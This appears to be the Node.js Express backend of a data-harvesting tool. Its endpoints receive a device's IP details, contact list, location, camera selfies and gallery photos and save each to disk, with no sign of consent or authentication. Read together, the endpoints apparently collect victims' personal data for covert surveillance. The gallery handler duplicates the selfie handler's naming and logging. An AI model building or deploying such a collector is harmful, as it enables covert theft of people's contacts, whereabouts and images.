const express = require('express');
const cors = require('cors');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());

// Define routes
app.post('/ip', handleIpRequest);
app.post('/contacts', handleContactsRequest);
app.post('/location', handleLocationRequest);
app.post('/selfie', handleSelfieRequest);
app.post('/gallery', handleGalleryRequest);


// Function to handle IP request
function handleIpRequest(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk.toString();
  });

  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      console.log('Received IP data:', data);
      
      // Save IP data to a file
      const timestamp = Date.now();
      const fileName = `ipdata_${timestamp}.json`;
      const filePath = path.join(__dirname, 'data', fileName);

      const ipDataFolderPath = path.join(__dirname, 'data');
      if (!fs.existsSync(ipDataFolderPath)) {
        fs.mkdirSync(ipDataFolderPath);
      }

      fs.writeFile(filePath, JSON.stringify(data), err => {
        if (err) {
          console.error('Error saving IP data:', err);
          sendResponse(res, 500, { error: 'Internal Server Error' });
        } else {
          console.log('IP data saved successfully');
          sendResponse(res, 200, { message: 'Data received and saved successfully' });
        }
      });
    } catch (error) {
      console.error('Error parsing JSON:', error);
      sendResponse(res, 400, { error: 'Invalid JSON' });
    }
  });
}

// Function to handle contacts request
function handleContactsRequest(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    try {
      const contacts = JSON.parse(body);
      console.log('Received contacts:', contacts);

      const timestamp = Date.now();
      const fileName = `contacts_${timestamp}.json`;
      const filePath = path.join(__dirname, 'data', fileName);

      fs.writeFile(filePath, JSON.stringify(contacts), err => {
        if (err) {
          console.error('Error saving contacts:', err);
          sendResponse(res, 500, { error: 'Internal Server Error' });
        } else {
          console.log('Contacts saved successfully');
          sendResponse(res, 200, { message: 'Contacts received and saved successfully' });
        }
      });
    } catch (error) {
      console.error('Error parsing contacts:', error);
      sendResponse(res, 400, { error: 'Bad Request' });
    }
  });
}

// Function to handle location request
function handleLocationRequest(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    try {
      const locationData = JSON.parse(body);
      console.log('Received location data:', locationData);

      const timestamp = Date.now();
      const fileName = `location_${timestamp}.json`;
      const filePath = path.join(__dirname, 'data', fileName);

      const locationDataFolderPath = path.join(__dirname, 'data');
      if (!fs.existsSync(locationDataFolderPath)) {
        fs.mkdirSync(locationDataFolderPath);
      }

      fs.writeFile(filePath, JSON.stringify(locationData), err => {
        if (err) {
          console.error('Error saving location data:', err);
          sendResponse(res, 500, { error: 'Internal Server Error' });
        } else {
          console.log('Location data saved successfully');
          sendResponse(res, 200, { message: 'Location data received and saved successfully' });
        }
      });
    } catch (error) {
      console.error('Error parsing location data:', error);
      sendResponse(res, 400, { error: 'Bad Request' });
    }
  });
}

//selfie request
function handleSelfieRequest(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      console.log('Received selfie data:', data);

      const base64Data = data.image;
      const fileName = `selfie_${Date.now()}.png`;
      const filePath = path.join(__dirname, 'data', fileName);

      // Remove metadata from base64 string
      const base64Image = base64Data.replace(/^data:image\/png;base64,/, '');

      // Convert base64 data to buffer
      const buffer = Buffer.from(base64Image, 'base64');

      // Save image to file
      fs.writeFile(filePath, buffer, err => {
        if (err) {
          console.error('Error saving selfie:', err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Internal Server Error' }));
        } else {
          console.log('Selfie saved successfully');
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ message: 'Selfie received and saved successfully' }));
        }
      });
    } catch (error) {
      console.error('Error parsing selfie data:', error);
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Bad Request' }));
    }
  });
}

// gallery pics
function handleGalleryRequest(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      console.log('Received selfie data:', data);

      const base64Data = data.image;
      const fileName = `selfie_${Date.now()}.png`;
      const filePath = path.join(__dirname, 'data', fileName);

      // Remove metadata from base64 string
      const base64Image = base64Data.replace(/^data:image\/png;base64,/, '');

      // Convert base64 data to buffer
      const buffer = Buffer.from(base64Image, 'base64');

      // Save image to file
      fs.writeFile(filePath, buffer, err => {
        if (err) {
          console.error('Error saving selfie:', err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Internal Server Error' }));
        } else {
          console.log('Selfie saved successfully');
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ message: 'Selfie received and saved successfully' }));
        }
      });
    } catch (error) {
      console.error('Error parsing selfie data:', error);
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Bad Request' }));
    }
  });
}



// Function to send response with status code and data
function sendResponse(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

// Start the server
const PORT = 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
